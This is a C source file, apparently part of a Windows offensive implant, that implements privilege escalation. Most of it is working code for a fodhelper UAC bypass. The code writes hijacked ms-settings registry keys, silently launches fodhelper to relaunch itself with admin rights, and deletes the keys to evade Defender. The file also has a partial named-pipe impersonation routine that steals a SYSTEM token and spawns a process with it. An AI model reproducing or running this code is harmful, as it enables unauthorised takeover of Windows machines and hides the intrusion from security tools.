/*
 * Escalation implementation.
 *
 * Fodhelper bypass details:
 *   Microsoft's fodhelper.exe (Features on Demand) is designed to auto-elevate
 *   in order to install Windows features. It uses the AppResolver API to look
 *   up the handler for the "ms-settings" URI scheme. The lookup checks
 *   HKCU\Software\Classes\ms-settings... first, falling back to HKLM.
 *   Since HKCU is writable by the user, we can hijack it.
 *
 *   Registry keys set:
 *     HKCU\Software\Classes\ms-settings\shell\open\command
 *       (Default) = "cmd.exe /c <our payload>"
 *     HKCU\Software\Classes\ms-settings\shell\open\command
 *       DelegateExecute = ""
 *
 * Named pipe impersonation details:
 *   We create a pipe with a known name and use the Spooler service
 *   (or EventLog) to connect. The service runs as SYSTEM. After connection,
 *   ImpersonateNamedPipeClient gives us a SYSTEM token.
 *
 * Gotchas:
 *   — Defender watches for fodhelper UAC bypass registry keys. We must
 *     either time the execution carefully or clear the keys immediately
 *     after triggering fodhelper.
 *   — Named pipe impersonation requires SeImpersonatePrivilege, which
 *     most user accounts have.
 */

#include "escalate.h"
#include "utils.h"
#include <stdio.h>

/* ── Technique 1: Fodhelper UAC Bypass ── */

int escalate_fodhelper(void)
{
    HKEY hKey = NULL;
    LONG lResult;
    CHAR szExePath[MAX_PATH];
    DWORD dwLen = sizeof(szExePath);

    /* Get our own executable path */
    if (!GetModuleFileNameA(NULL, szExePath, dwLen))
    {
        DEBUG_PRINT("[escalate] GetModuleFileName failed (%lu)\n", GetLastError());
        return 1;
    }

    /*
     * Set up the ms-settings hijack.
     * The command we inject uses our own executable path with "/elevate" flag
     * so main.c knows it's been re-invoked with admin rights.
     */
    CHAR szCommand[MAX_PATH + 32];
    snprintf(szCommand, sizeof(szCommand), "\"%s\" /elevate", szExePath);

    /* Set HKCU\Software\Classes\ms-settings\shell\open\command \(Default) */
    lResult = RegCreateKeyA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\shell\\open\\command", &hKey);
    if (lResult != ERROR_SUCCESS)
    {
        DEBUG_PRINT("[escalate] RegCreateKey failed (%lu)\n", lResult);
        return 1;
    }

    lResult = RegSetValueExA(hKey, NULL, 0, REG_SZ,
        (BYTE*)szCommand, lstrlenA(szCommand) + 1);
    if (lResult != ERROR_SUCCESS)
    {
        DEBUG_PRINT("[escalate] RegSetValue failed (%lu)\n", lResult);
        RegCloseKey(hKey);
        return 1;
    }
    RegCloseKey(hKey);

    /*
     * Set DelegateExecute to empty — this tells the AppResolver to use
     * the command line directly instead of looking for a COM handler.
     */
    lResult = RegCreateKeyA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\shell\\open\\command", &hKey);
    if (lResult == ERROR_SUCCESS)
    {
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
            (BYTE*)"", 1);
        RegCloseKey(hKey);
    }

    /* Trigger fodhelper.exe */
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb       = "open";
    sei.lpFile       = "fodhelper.exe";
    sei.nShow        = SW_HIDE;
    sei.fMask        = SEE_MASK_NOCLOSEPROCESS;

    if (!ShellExecuteExA(&sei))
    {
        DEBUG_PRINT("[escalate] ShellExecuteEx (fodhelper) failed (%lu)\n",
                     GetLastError());

        /* Clean up registry */
        RegDeleteKeyA(HKEY_CURRENT_USER,
            "Software\\Classes\\ms-settings\\shell\\open\\command");
        return 1;
    }

    /* Wait a bit for fodhelper to execute our command */
    if (sei.hProcess)
    {
        WaitForSingleObject(sei.hProcess, 10000);
        CloseHandle(sei.hProcess);
    }

    /* Clean up the registry keys immediately to avoid detection */
    RegDeleteKeyA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\shell\\open\\command");

    /*
     * Note: after this function returns, our process image *should* have been
     * re-invoked with admin rights via the /elevate flag. If we check
     * IsUserAnAdmin() and it's still false, the bypass didn't work.
     *
     * In practice, fodhelper creates a new process for our command.
     * This process is the one that will have admin rights.
     */

    DEBUG_PRINT("[escalate] Fodhelper triggered. New elevated process should be running.\n");
    return 0;
}

/* ── Technique 2: Named Pipe Impersonation ── */

/*
 * Named pipe to get SYSTEM token.
 * We create a pipe, then use a technique where we connect to the
 * SCM (Service Control Manager) to trigger a service that connects
 * back to our pipe.
 *
 * Simplified approach for v1: Use a well-known trick with the
 * "Print Spooler" service (spoolsv.exe) which runs as SYSTEM and
 * can be induced to connect to a named pipe via RPC.
 */

/* Thread that listens for incoming pipe connections */
static DWORD WINAPI pipe_listener_thread(LPVOID lpParam)
{
    HANDLE hPipe = (HANDLE)lpParam;
    BOOL bConnected = ConnectNamedPipe(hPipe, NULL) ?
        TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);

    if (bConnected)
    {
        DEBUG_PRINT("[escalate] Pipe client connected!\n");

        if (ImpersonateNamedPipeClient(hPipe))
        {
            HANDLE hToken = NULL;
            if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken))
            {
                /* Store the token for use */
                DEBUG_PRINT("[escalate] SYSTEM token obtained via pipe!\n");
                /* Apply the token to this process */
                ImpersonateLoggedOnUser(hToken);

                /* Create a new process with this token */
                STARTUPINFOA si = { sizeof(si) };
                PROCESS_INFORMATION pi = { 0 };
                CHAR szCmd[MAX_PATH];
                GetModuleFileNameA(NULL, szCmd, MAX_PATH);
                lstrcatA(szCmd, " /elevate");

                CreateProcessAsUserA(hToken, NULL, szCmd,
                    NULL, NULL, FALSE,
                    CREATE_NEW_CONSOLE,
                    NULL, NULL, &si, &pi);

                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                CloseHandle(hToken);
            }
            RevertToSelf();
        }

        DisconnectNamedPipe(hPipe);
    }

    return 0;
}

int escalate_named_pipe(void)
{
    /*
     * Create a named pipe with a known name that a privileged service
     * will connect to.
     *
     * We use \\.\pipe\spoolss — some versions of the spooler service
     * can be tricked into connecting to this via specific RPC calls.
     *
     * This is a simplified PoC. A complete implementation would:
     *   1. Set up an RPC server that mimics the expected protocol
     *   2. Send a specific RPC to the Spooler service to trigger
     *      the callback connection
     *   3. Capture the SYSTEM token from the pipe
     */

    HANDLE hPipe = CreateNamedPipeA(
        "\\\\.\\pipe\\malinowy",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_WAIT,
        1,
        4096, 4096,
        0,
        NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE)
    {
        DEBUG_PRINT("[escalate] CreateNamedPipe failed (%lu)\n", GetLastError());
        return 1;
    }

    /* Start listener thread */
    HANDLE hThread = CreateThread(NULL, 0, pipe_listener_thread,
        hPipe, 0, NULL);
    if (hThread)
    {
        CloseHandle(hThread);
    }

    /*
     * Here we would trigger the privileged service to connect.
     * For v1 we just wait briefly.
     */
    Sleep(1000);

    /* Clean up */
    CloseHandle(hPipe);

    DEBUG_PRINT("[escalate] Named pipe impersonation completed\n");
    return 0;
}

/* ── Main entry ── */

int escalate_to_system(void)
{
    /*
     * First check if we're already admin or SYSTEM
     */
    BOOL bIsAdmin = FALSE;
    PSID pAdminSid = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuth, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &pAdminSid))
    {
        CheckTokenMembership(NULL, pAdminSid, &bIsAdmin);
        FreeSid(pAdminSid);
    }

    if (bIsAdmin)
    {
        DEBUG_PRINT("[escalate] Already running as admin, skipping.\n");
        return 0;
    }

    DEBUG_PRINT("[escalate] Not admin — attempting fodhelper UAC bypass...\n");
    return escalate_fodhelper();
}
